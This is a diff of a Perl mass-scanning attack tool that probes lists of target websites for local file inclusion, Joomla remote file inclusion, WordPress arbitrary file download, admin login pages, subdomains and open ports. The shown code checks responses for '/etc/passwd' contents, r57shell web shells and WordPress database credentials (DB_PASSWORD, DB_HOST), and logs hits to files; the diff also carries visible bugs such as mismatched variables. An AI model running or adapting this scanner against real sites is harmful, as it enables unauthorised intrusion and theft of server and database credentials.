+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
 	  print color RESET;
-	}elsif ($Source =~ m/root:x:0:0:root:/i) {
+      print "$LFI \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
+	
+    if ($html =~ m/root:x:0:0:root:/i) {
 	  print color 'green';
-      print "[!] $URL\n";
+      print "$URL\n";
 	  print color RESET;
-	}
-	
-    my $URL1 = $URL;
-    $request = HTTP::Request->new('GET', $URL1);
-    $response = $ua->request($request);
-    print color 'bold yellow';
-    print "[!] INFO:   ";
-    print color RESET;
-    if($response = RC_OK){
-      print "HTTP/1.1 200 OK  ";
-      print "\n";
-    }  
-	open (INFO, '>>LFI_Scan.txt');
-    print INFO "$URL\n";
-	close (INFO);
-    print "[ ]............................................................................ \n";
-  }### END FOREACH
+	  open (INFO, '>>LFI_Scan.txt');
+      print INFO "$Target\n";
+      close (INFO);
+	}else{
+	  print color 'red';
+      print "Not Vulnerable! \n";
+	  print color RESET;
+    }
+  }
+  print "[ ]............................................................................ \n";
   finlfi();
-############################## 
-} ##sub mtLfi 
+}
 
 ###################################################################		
 sub finlfi {
@@ -2122,53 +1989,61 @@ sub mljoomrfi {
   listchekjoomrfi();
   RFI();
   mlistname();
-  scandetail();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
 	chomp $Target;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-		
+	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
-
-    foreach $RFI(@RFI){
-      my $URL =$Target.$RFI.$shell;
-	  $URL =~ s/ //g;
+    print "$Target \n";
+	
+    my $Target = $Target;
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "  [+] INFO: ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }
+	  
+	foreach $RFI(@RFI){
+      my $URL = $Target.$LFI;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
-      my $Source = $response->content;
-
-      if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
+      my $html = $response->content;
 	  
-	    print color 'bold yellow';
-	    print "[!] VULN: ";
-	    print color RESET;
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$RFI \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
 
+	  if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
 	    print color 'green';
         print "$URL\n";
 	    print color RESET;
-		
-        my $URL1 = $URL;
-        $request = HTTP::Request->new('GET', $URL1);
-        $response = $ua->request($request);
-        print color 'bold yellow';
-        print "[!] INFO:   ";
-        print color RESET;
-        if($response = RC_OK){
-          print "HTTP/1.1 200 OK  ";
-          print "\n";
-        }  
-           
-        open (INFO, '>>Joom_RFI_Scan.txt');
-        print INFO "$URL\n";
+		open (INFO, '>>Joom_RFI_Scan.txt');
+        print INFO "$Target\n";
         close (INFO);
-        print "[ ]............................................................................ \n";
+	  }else{
+	    print color 'red';
+        print "Not Vulnerable! \n";
+	    print color RESET;
 	  }
-    } ### END FOREACH
-  } ## END WHILE
+    }
+	print "[ ]............................................................................ \n";
+  }
+  finjoomrfi();
 }
 
 ###################################################################		
@@ -2177,39 +2052,53 @@ sub mtjoomrfi {
   RFI();
   Target();
   scandetail();
-  countargets();
+  print "[ ]............................................................................ \n";
+  
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "  [+] INFO: ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
   foreach $RFI(@RFI){
-    my $URL =$Target.$RFI.$shell;
-	$URL =~ s/ //g;
+    my $URL = $Target.$LFI;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
-    my $Source = $response->content;
-
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-
+    my $html = $response->content;
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "RFI \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
+	
     if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
 	  print color 'green';
       print "$URL\n";
 	  print color RESET;
-          
-      my $URL1 = $URL;
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      print color 'bold yellow';
-      print "[!] INFO:   ";
-      print color RESET;
-      if($response = RC_OK){
-        print "HTTP/1.1 200 OK  ";
-        print "\n";
-      }  
-      print "[ ]............................................................................ \n";
-      open (INFO, '>>Joom_RFI_Scan.txt');
-      print INFO "$URL\n";
+	  open (INFO, '>>Joom_RFI_Scan.txt');
+      print INFO "$Target\n";
       close (INFO);
-	}
+	}else{
+	  print color 'red';
+      print "Not Vulnerable! \n";
+	  print color RESET;
+    }
   }
+  print "[ ]............................................................................ \n";
+  finjoomrfi();
 }
 
 ###################################################################		
@@ -2240,10 +2129,10 @@ sub finjoomrfi {
 	  
 	print color 'yellow';
     print "[!] Results saved in $Bin/Joom_RFI_Scan.txt! \n";
-	 print color RESET;
+	print color RESET;
   }else{ 
 	print color 'red';
-    print "[+] No Joomla Lfi Found! \n";
+    print "[+] No Joomla Rfi Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -2257,91 +2146,115 @@ sub mlwprfi {
   listchekwplfi();
   ADFWP();
   mlistname();
-  scandetail();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
-        
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
-    chomp $Target;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+	chomp $Target;
+	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
-        
-    foreach $ADFWP(@ADFWP){
-      my $URL = $Target.$ADFWP;
+    print "$Target \n";
+	
+    my $Target = $Target;
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "  [+] INFO: ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }
+	  
+	foreach $ADFWP(@ADFWP){
+      my $URL = $Target.$LFI;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
-      my $Source = $response->content;
-      if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
-	    print color 'bold yellow';
-	    print "[!] VULN: ";
-	    print color RESET;
+      my $html = $response->content;
+	  
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$ADFWP \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
 
+	  if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
 	    print color 'green';
-        print ' ', $response->request->uri, "\n";
+        print "$URL\n";
 	    print color RESET;
-            
-        my $URL1 = $URL;
-        $request = HTTP::Request->new('GET', $URL1);
-        $response = $ua->request($request);
-        print color 'bold yellow';
-        print "[!] INFO:   ";
-        print color RESET;
-        if($response = RC_OK){
-          print "HTTP/1.1 200 OK  ";
-          print "\n";
-        }  
-			
-        open (INFO, '>>WP_ADF_Scan.txt');
-        print INFO "$URL\n";
+		open (INFO, '>>WP_ADF_Scan.txt');
+        print INFO "$Target\n";
         close (INFO);
-        print "[ ]............................................................................ \n";
+	  }else{
+	    print color 'red';
+        print "Not Vulnerable! \n";
+	    print color RESET;
 	  }
     }
-  } ### END WHILE
+	print "[ ]............................................................................ \n";
+  }
   finwpadf();
 }
 
 #################################################################      
-sub mtwplfi {
+sub mtwprfi {
   listchekwplfi();
   ADFWP();
   Target();
   scandetail();
-  countargets();
-  forwait();
+  print "[ ]............................................................................ \n";
+  
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "  [+] INFO: ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
   foreach $ADFWP(@ADFWP){
-    my $URL = $Target.$ADFWP;
+    my $URL = $Target.$LFI;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
-    my $Source = $response->content;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
+    my $html = $response->content;
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "ADFWP \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
 	
     if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
 	  print color 'green';
-      print '    [!] ', $response->request->uri, "\n";
+      print "$URL\n";
 	  print color RESET;
-	  
-      my $URL1 = $URL;
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      print color 'bold yellow';
-      print "[!] INFO:   ";
-      print color RESET;
-      if($response = RC_OK){
-        print "HTTP/1.1 200 OK  ";
-        print "\n";
-      }  
-      open (INFO, '>>WP_ADF_Scan.txt');
-      print INFO "$URL\n";
+	  open (INFO, '>>WP_ADF_Scan.txt');
+      print INFO "$Target\n";
       close (INFO);
-      print "[ ]............................................................................ \n";
-	}
+	}else{
+	  print color 'red';
+      print "Not Vulnerable! \n";
+	  print color RESET;
+    }
   }
+  print "[ ]............................................................................ \n";
   finwpadf();
 }
 
@@ -2377,7 +2290,7 @@ sub finwpadf {
 	print color RESET;
   }else{ 
 	print color 'red';
-    print "[+] No Wordpress Lfi Found! \n";
+    print "[+] No Wordpress Adf Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -2391,61 +2304,70 @@ sub mladmin {
   listchekadmin();
   ADMIN();
   mlistname();
-  scandetail();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
-
   open (TEXT, $listname);
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
 	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-		
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
 	print "$Target \n";
         
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "  [!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }
+		
     foreach $ADMIN(@ADMIN){
       my $URL =$Target.$ADMIN;
       #my $ua = LWP::UserAgent->new;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $Source = $response->content;
-	  if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
 	  
-	    print color 'bold yellow';
-	    print "[!] VULN: ";
-	    print color RESET;
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$ADMIN \n";
+	  
+	  print color 'bold yellow';
+	  print "  [+] VULN: ";
+	  print color RESET;
 
+	  if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
         if ( $response->is_success and $response->previous ) {
 	      print color 'green';
-          print '[!] ', $request->url, ' REDITECT TO: ', "\n";
+          print '  ', $request->url, ' REDITECT TO: ', "\n";
 	      print color RESET;
 	      print color 'green';
-		  print '  => ', $response->request->uri, "\n";
+		  print '              => ', $response->request->uri, "\n";
 	      print color RESET;
 	    } else {
 	      print color 'green';
-          print '[!] ',$response->request->uri, "\n";
+          print '  ',$response->request->uri, "\n";
 	      print color RESET;
 	    }
 		$ul = $response->request->uri,;
-        my $URL1 = $ul;
-        $request = HTTP::Request->new('GET', $URL1);
-        $response = $ua->request($request);
-        print color 'bold yellow';
-        print "[!] INFO:   ";
-        print color RESET;
-        if($response = RC_OK){
-          print "HTTP/1.1 200 OK  ";
-          print "\n";
-        }  
         open (INFO, '>>Admin_page.txt');
         print INFO  "$ul\n";
 	    close (INFO);
-        print "[ ]............................................................................ \n";
+	  }else{
+	    print color 'red';
+        print "  Not Vulnerable! \n";
+	    print color RESET;
 	  }
     }
 	close (TXT);
+	print "[ ]............................................................................ \n";
   } 
   finadmin();
 }
@@ -2456,53 +2378,64 @@ sub mtadmin {
   ADMIN();
   Target();
   scandetail();
-  forwait();
-  print color 'yellow';
-  print "[!] Please Wait...\n";
+  print "[ ]............................................................................ \n";
+
+  print color 'bold yellow';
+  print "[!] TARGET: ";
   print color RESET;
+  print "$Target \n";
   
-      
+  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "  [+] INFO:   ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
   foreach $ADMIN(@ADMIN){
     my $URL = $Target.$ADMIN;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
-    my $Source = $response->content;
-	if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
-	  print color 'bold yellow';
-	  print "[!] TARGET:";
-	  print color RESET;
-
+    my $html = $response->content;
+	print color 'bold yellow';
+	print "  [+] EXPL:   ";
+	print color RESET;
+    print "$ADMIN \n";
+		
+    print color 'bold yellow';
+	print "  [+] VULN:   ";
+	print color RESET;
+	
+	if ((head($URL)) && ($html =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
       if ( $response->is_success and $response->previous ) {
 	    print color 'green';
-        print ' ', $request->url, ' REDITECT TO: ', "\n";
+        print '', $request->url, ' REDITECT TO: ', "\n";
 	    print color RESET;
 	    print color 'green';
-		print '  => ', $response->request->uri, "\n";
+		print '              => ', $response->request->uri, "\n";
 	    print color RESET;
-	  } else {
+	  }else {
 	    print color 'green';
-        print '[!] ',$response->request->uri, "\n";
+        print '',$response->request->uri, "\n";
 	    print color RESET;
 	  }
 	  $ul = $response->request->uri,;
-	  
-      my $URL1 = $ul;
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      print color 'bold yellow';
-      print "[!] INFO:   ";
-      print color RESET;
-      if($response = RC_OK){
-        print "HTTP/1.1 200 OK  ";
-        print "\n";
-      }  
-	  
-      open (INFO, '>>Admin_page.txt');
-      print INFO  "$ul\n";
-	  close (INFO);
-    print "[ ]............................................................................ \n";
-	}
+
+	  print color RESET;
+	  open (INFO, '>>Admin_page.txt');
+      print INFO "$Target\n";
+      close (INFO);
+	}else{
+	  print color 'red';
+      print "Not Admin Page! \n";
+	  print color RESET;
+    }
   }
+  print "[ ]............................................................................ \n";
   finadmin();
 }
 
@@ -2537,7 +2470,7 @@ sub finadmin {
 	print color RESET;
   }else{ 
 	print color 'red';
-    print "[+] No Admin Page Login Found! \n";
+    print "[+] Not Admin Page found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -2551,11 +2484,12 @@ sub mlsubdomain {
   listcheksubdomain();
   SUBDOMAIN();
   mlistname();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
-  scandetail();
-  forwait();
   open (TEXT, $listname);
-  while (my $Target = <TEXT>) { 
+  while (my $Target = <TEXT>) {
 	chomp $Target;
 	if (index($Target, 'http://www.') != -1) {
 	  $Target =~ s/http:\/\/www.//g;
@@ -2563,42 +2497,53 @@ sub mlsubdomain {
 	if (index($Target, 'www.') != -1) {
 	  $Target =~ s/www.//g;
 	}
+
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
-
-	foreach $SUBDOMAIN(@SUBDOMAIN){	
-	  my $URL = $SUBDOMAIN.$Target;
+    print "$Target\n";
+	
+    my $Target = $Target;
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "  [+] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK \n";
+    }
+	  
+	foreach $SUBDOMAIN(@SUBDOMAIN){
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$SUBDOMAIN \n";
+	
+      my $URL = $SUBDOMAIN.$Target;
 	  my $socket=IO::Socket::INET->new(
       PeerAddr=>"$URL",
       Proto=>'icmp',
       timeout=>1);
+	  
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
 	  if ($socket ne "") { 
-	  
-	    print color 'bold yellow';
-	    print "[!] TARGET: ";
-	    print color RESET;
-	
 	    print color 'green';
-        print "http://$URL\n";
+        print "$URL\n";
 	    print color RESET;
-	  
-        my $URL1 = "http://$URL";
-        $request = HTTP::Request->new('GET', $URL1);
-        $response = $ua->request($request);
-        print color 'bold yellow';
-        print "[!] INFO:   ";
-        print color RESET;
-        if($response = RC_OK){
-          print "HTTP/1.1 200 OK  ";
-          print "\n";
-        }
-        print "[ ]............................................................................ \n";
-	  }	
-	}
+	    open (INFO, '>>Subdomains_Scan.txt');
+        print INFO "$URL\n";
+	    close (INFO);
+	  }else{
+	    print color 'red';
+        print "Not Vulnerable! \n";
+	    print color RESET;
+	  }
+    }
+	print "[ ]............................................................................ \n";
   }
-  finsubdomain();
+  finxss();
 }
 
 #################################################################      
@@ -2607,47 +2552,59 @@ sub mtsubdomain {
   SUBDOMAIN();
   Target();
   scandetail();
-  forwait();
-
-	if (index($Target, 'http://www.') != -1) {
-	  $Target =~ s/http:\/\/www.//g;
-	}
-	if (index($Target, 'www.') != -1) {
-	  $Target =~ s/www.//g;
-	}
-
-  foreach $SUBDOMAIN(@SUBDOMAIN){	
-  my $URL = $SUBDOMAIN.$Target;
-	my $socket=IO::Socket::INET->new(
-    PeerAddr=>"$URL",
-    Proto=>'icmp',
-    timeout=>1);	
-	if ($socket ne "") { 
-	  print color 'bold yellow';
-	  print "[!] TARGET: ";
-	  print color RESET;
-	
-	  print color 'green';
-      print "http://$URL\n";
-	  print color RESET;
-	  
-      my $URL1 = "http://$URL";
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      print color 'bold yellow';
-      print "[!] INFO:   ";
-      print color RESET;
-      if($response = RC_OK){
-        print "HTTP/1.1 200 OK  ";
-        print "\n";
-      }  
-
-	  open (INFO, '>>Subdomains_Scan.txt');
-      print INFO "http://$URL\n";
-	  close (INFO);
-    print "[ ]............................................................................ \n";
-	}
+  print "[ ]............................................................................ \n";
+  
+  if (index($Target, 'http://www.') != -1) {
+	$Target =~ s/http:\/\/www.//g;
   }
+  if (index($Target, 'www.') != -1) {
+	$Target =~ s/www.//g;
+  }
+  if($Target !~ /http:\/\//) { $Target = "$Target"; };
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target\n";
+  
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "  [+] INFO: ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+	foreach $SUBDOMAIN(@SUBDOMAIN){
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$SUBDOMAIN \n";
+	
+      my $URL = $SUBDOMAIN.$Target;
+	  my $socket=IO::Socket::INET->new(
+      PeerAddr=>"$URL",
+      Proto=>'icmp',
+      timeout=>1);
+	  
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
+	  if ($socket ne "") { 
+	    print color 'green';
+        print "$URL\n";
+	    print color RESET;
+	    open (INFO, '>>Subdomains_Scan.txt');
+        print INFO "$URL\n";
+	    close (INFO);
+	  }else{
+	  print color 'red';
+      print "Not Subdomain! \n";
+	  print color RESET;
+    }
+  }
+  print "[ ]............................................................................ \n";
   finsubdomain();
 }
 
@@ -2721,57 +2678,76 @@ sub finports {
 ##################################
 sub basic {
   server();
-  $type=$_[0];
-  if (defined $mbasic) {
-    scandetail();
-  }
+  scandetail();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
   open (TEXT, "servers.txt");
-  while (my $Target = <TEXT>) { ###
+  while (my $Target = <TEXT>) {
 	chomp $Target;
-	print color 'bold yellow';
+	
+	print color 'bold magenta';
 	print "[!] TARGET: ";
 	print color RESET;
 	print "$Target \n";
 
 	$Target=$Target;
-	sleep(1);
+    if ((!defined $mtcp) && (!defined $mudp)) {$type=$_[0]; } 
     $closed1=0;
     @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
     foreach $port1(@PORTS){
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
       close $socket;
+	  
+	  print color 'bold yellow';
+      print "    [+] TYPE:  ";
+      print color RESET;
+      print "$type  ";
+
+	  print color 'bold yellow';
+      print "PORT:  ";
+      print color RESET;
+      print "$port1  ";
+	  
+	  print color 'bold yellow';
+      print "INFO:  ";
+      print color RESET;
       if ($closed1==0){
 	    print color 'green';
-        print "[!] Open '$type' Port -> ";
-        print "$port1\n";
+        print "Open!\n";
 		print color RESET;
-      }
+      }else{
+	    print color 'red';
+        print "Closed!\n";
+		print color RESET;
+	  }
       $closed1=0;
     }
+    print "[ ]............................................................................ \n";
   }
   print "\n";
   print color 'red';
   timer();
   print "SCAN FINISHED!\n";
   print color RESET;
-  }
+}
 
 ################################
 sub basic2 {
   server();
-  if (defined $mbasic) {
-    scandetail();
-  }
+  scandetail();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-	print color 'bold yellow';
+	print color 'bold magenta';
 	print "[!] TARGET: ";
 	print color RESET;
 	print "$Target \n";
-
 	$Target=$Target;
     $closed2=0;
     $closed3=0;
@@ -2779,23 +2755,76 @@ sub basic2 {
     foreach $port2(@PORTS){
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
       close $socket;
+      $closed2=0;
       $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
       close $socket2;
-      if ($closed2==0){
-	    print color 'green';
-        print "[!] Open TCP Port -> ";
-        print "$port2\n";
-		print color RESET;
-      }
+	    if ($closed2==0){
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port2  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open!\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port2  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed \n!";
+        print color RESET;
+	  }
+	  
       if ($closed3==0){
-	    print color 'green';
-        print "\n    [!] Open UDP Port -> ";
-        print "$port2";
-		print color RESET;
-      }
-      $closed2=0;
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port2  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open!\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port2  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed!\n\n";
+        print color RESET;
+	  }
+	  $closed2=0;
       $closed3=0;
     }
+    print "\n[ ]............................................................................ \n";
   }
   print "\n";
   print color 'red';
@@ -2807,35 +2836,59 @@ sub basic2 {
 #########################################
 sub complete {
   server();
-  $type2=$_[0];
-  if (defined $mall) {
-    scandetail();
+  if (defined $mall){
+    $type2=$mall;
+  }else{
+    $type2=$_[0];
   }
+  scandetail();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
-  open (TEXT, "servers.txt");
-  while (my $Target = <TEXT>) { ###
-	chomp $Target;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	print "$Target \n";
 
-	$Target=$Target;
-	sleep(1);
-    $closed3=0;
-    $port3=1;
-    while ($port3<=65535){
+  $closed3=0;
+  $port3=1;
+  while ($port3<=65535){
+  
+    open (TEXT, "servers.txt");
+    while (my $Target = <TEXT>) { ###
+	  chomp $Target;
+	  print color 'bold magenta';
+	  print "[!] TARGET: ";
+	  print color RESET;
+	  print "$Target \n";
+  
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
       close $socket;
+	  
+	  print color 'bold yellow';
+      print "    [+] TYPE:  ";
+      print color RESET;
+      print "$type2  ";
+
+	  print color 'bold yellow';
+      print "PORT:  ";
+      print color RESET;
+      print "$port3  ";
+	  
+	  print color 'bold yellow';
+      print "INFO:  ";
+      print color RESET;
+	  
       if ($closed3==0){
 	    print color 'green';
-        print "[!] Open $type2 Port -> ";
-        print "$port3\n";
+        print "Open!\n";
 		print color RESET;
-      }
+      }else{
+	    print color 'red';
+        print "Closed!\n\n";
+		print color RESET;
+	  }
 	}
     $closed3=0;
     $port3++;
+    print "[ ]............................................................................ \n";
   }
   print "\n";
   print color 'red';
@@ -2847,46 +2900,100 @@ sub complete {
 #####################################
 sub complete2 {
   server();
-  if (defined $mall) {
-    scandetail();
-  }
+  scandetail();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
-  open (TEXT, "servers.txt");
-  while (my $Target = <TEXT>) { ###
-	chomp $Target;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	print "$Target \n";
 
-	$Target=$Target;
-	sleep(1);
-    $closed4=0;
-    $closed5=0;
-    $port4=1;
-    while ($port4<=65535){
+  $closed4=0;
+  $closed5=0;
+  $port4=1;
+  while ($port4<=65535){
+  
+    open (TEXT, "servers.txt");
+    while (my $Target = <TEXT>) { ###
+	  chomp $Target;
+	  print color 'bold yellow';
+	  print "[!] TARGET: ";
+	  print color RESET;
+	  print "$Target \n";
+	  
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
       close $socket;
       $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
       close $socket2;
+	  
       if ($closed4==0){
-	    print color 'green';
-        print "[!] Found TCP An Open Port -> ";
-        print "$port4\n";
-	    print color RESET;
-      }
-
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open\n\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed\n\n";
+        print color RESET;
+	  }
+	  
       if ($closed5==0){
-	    print color 'green';
-        print "[!] Found UDP An Open Port -> ";
-        print "$port4\n";
-	    print color RESET;
-      }
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open\n\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed\n\n";
+        print color RESET;
+	  }
     }
     $closed4=0;
     $closed5=0;
     $port4++;
+    print "[ ]............................................................................ \n";
   }
+  
   print "\n";
   print color 'red';
   timer();
@@ -2914,34 +3021,57 @@ sub subuser {
 #########################################
 sub user {
   subuser();
